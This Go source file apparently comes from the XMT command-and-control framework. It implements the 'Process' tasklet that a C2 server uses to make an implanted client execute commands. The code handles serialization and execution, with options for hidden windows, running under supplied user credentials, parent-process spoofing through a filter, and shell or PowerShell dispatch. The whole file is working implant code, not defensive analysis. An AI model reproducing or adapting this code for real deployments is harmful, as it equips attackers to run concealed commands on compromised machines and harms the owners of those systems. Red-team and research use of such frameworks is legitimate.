// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import (
	"bytes"
	"context"
	"strings"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
)

// Process is a Tasklet that is similar to the 'cmd.Process' struct. This is
// used to Task a Client with running a specified command.
//
// This can be directly used in the Session 'Tasklet' function instead of
// directly creating a Task.
//
// The Filter attribute will attempt to set the target that runs the Process.
// If none are specified, the Process will be ran under the client process.
//
// C2 Details:
//  ID: TvExecute
//
//  Input:
//      Process struct {
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          bool            // Hide
//          string          // Username
//          string          // Domain
//          string          // Password
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
type Process struct {
	Filter             *filter.Filter
	Dir                string
	User, Domain, Pass string

	Env, Args []string
	Stdin     []byte
	Timeout   time.Duration

	Flags      uint32
	Wait, Hide bool
}

// Packet will take the configured Process options and will return a Packet
// and any errors that may occur during building.
//
// This allows Process to fulfil the 'Tasklet' interface.
//
// C2 Details:
//  ID: TvAssembly
//
//  Input:
//      Process struct {
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          bool            // Hide
//          string          // Username
//          string          // Domain
//          string          // Password
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
func (p Process) Packet() (*com.Packet, error) {
	n := &com.Packet{ID: TvExecute}
	p.MarshalStream(n)
	return n, nil
}

// MarshalStream writes the data for this Process to the supplied Writer.
func (p Process) MarshalStream(w data.Writer) error {
	if err := data.WriteStringList(w, p.Args); err != nil {
		return err
	}
	if err := w.WriteString(p.Dir); err != nil {
		return err
	}
	if err := data.WriteStringList(w, p.Env); err != nil {
		return err
	}
	if err := w.WriteBool(p.Wait); err != nil {
		return err
	}
	if err := w.WriteUint32(p.Flags); err != nil {
		return err
	}
	if err := w.WriteInt64(int64(p.Timeout)); err != nil {
		return err
	}
	if err := w.WriteBool(p.Hide); err != nil {
		return err
	}
	if err := w.WriteString(p.User); err != nil {
		return err
	}
	if err := w.WriteString(p.Domain); err != nil {
		return err
	}
	if err := w.WriteString(p.Pass); err != nil {
		return err
	}
	if err := p.Filter.MarshalStream(w); err != nil {
		return err
	}
	if err := w.WriteBytes(p.Stdin); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream reads the data for this Process from the supplied Reader.
func (p *Process) UnmarshalStream(r data.Reader) error {
	if err := data.ReadStringList(r, &p.Args); err != nil {
		return err
	}
	if err := r.ReadString(&p.Dir); err != nil {
		return err
	}
	if err := data.ReadStringList(r, &p.Env); err != nil {
		return err
	}
	if err := r.ReadBool(&p.Wait); err != nil {
		return err
	}
	if err := r.ReadUint32(&p.Flags); err != nil {
		return err
	}
	if err := r.ReadInt64((*int64)(&p.Timeout)); err != nil {
		return err
	}
	if err := r.ReadBool(&p.Hide); err != nil {
		return err
	}
	if err := r.ReadString(&p.User); err != nil {
		return err
	}
	if err := r.ReadString(&p.Domain); err != nil {
		return err
	}
	if err := r.ReadString(&p.Pass); err != nil {
		return err
	}
	if err := filter.UnmarshalStream(r, &p.Filter); err != nil {
		return err
	}
	if err := r.ReadBytes(&p.Stdin); err != nil {
		return err
	}
	return nil
}
func taskProcess(x context.Context, r data.Reader, w data.Writer) error {
	p, z, err := ProcessUnmarshal(x, r)
	if err != nil {
		return err
	}
	if z {
		w.WriteUint64(0)
		p.Stdout, p.Stderr = w, w
	}
	if err = p.Start(); err != nil {
		p.Stdout, p.Stderr = nil, nil
		return err
	}
	if p.Stdin = nil; !z {
		// NOTE(dij): Push PID 32bits higher, since exit code is zero anyway.
		w.WriteUint64(uint64(p.Pid()) << 32)
		p.Release()
		return nil
	}
	i := p.Pid()
	err, p.Stdout, p.Stderr = p.Wait(), nil, nil
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	var (
		c, _ = p.ExitCode()
		s    = w.(backer)
		//     ^ This should NEVER panic!
	)
	s.WriteUint32Pos(0, i)
	s.WriteUint32Pos(4, uint32(c))
	return nil
}

// ProcessUnmarshal will read this Process's struct data from the supplied
// reader and returns a Process runnable struct along with the wait boolean.
//
// This function returns an error if building or reading fails.
func ProcessUnmarshal(x context.Context, r data.Reader) (*cmd.Process, bool, error) {
	var p Process
	if err := p.UnmarshalStream(r); err != nil {
		return nil, false, err
	}
	if len(p.Args) == 0 {
		return nil, false, cmd.ErrEmptyCommand
	}
	v := cmd.NewProcessContext(x, p.Args...)
	if len(p.Args[0]) == 7 && p.Args[0][0] == '@' && p.Args[0][6] == '@' && p.Args[0][1] == 'S' && p.Args[0][5] == 'L' {
		if len(p.Args) == 1 {
			v.Args = []string{device.Shell}
		} else {
			v.Args = []string{device.Shell, device.ShellArgs, strings.Join(p.Args[1:], " ")}
		}
	} else if len(p.Args[0]) == 7 && p.Args[0][0] == '@' && p.Args[0][6] == '@' && p.Args[0][1] == 'P' && p.Args[0][5] == 'L' {
		if len(p.Args) == 1 {
			v.Args = []string{device.PowerShell}
		} else {
			v.Args = append([]string{device.PowerShell}, p.Args[1:]...)
		}
	}
	if v.SetFlags(p.Flags); p.Hide {
		v.SetNoWindow(true)
		v.SetWindowDisplay(0)
	}
	if v.SetParent(p.Filter); len(p.Stdin) > 0 {
		v.Stdin = bytes.NewReader(p.Stdin)
	}
	if v.Timeout, v.Dir, v.Env = p.Timeout, p.Dir, p.Env; len(p.User) > 0 {
		v.SetLogin(p.User, p.Domain, p.Pass)
	}
	return v, p.Wait, nil
}
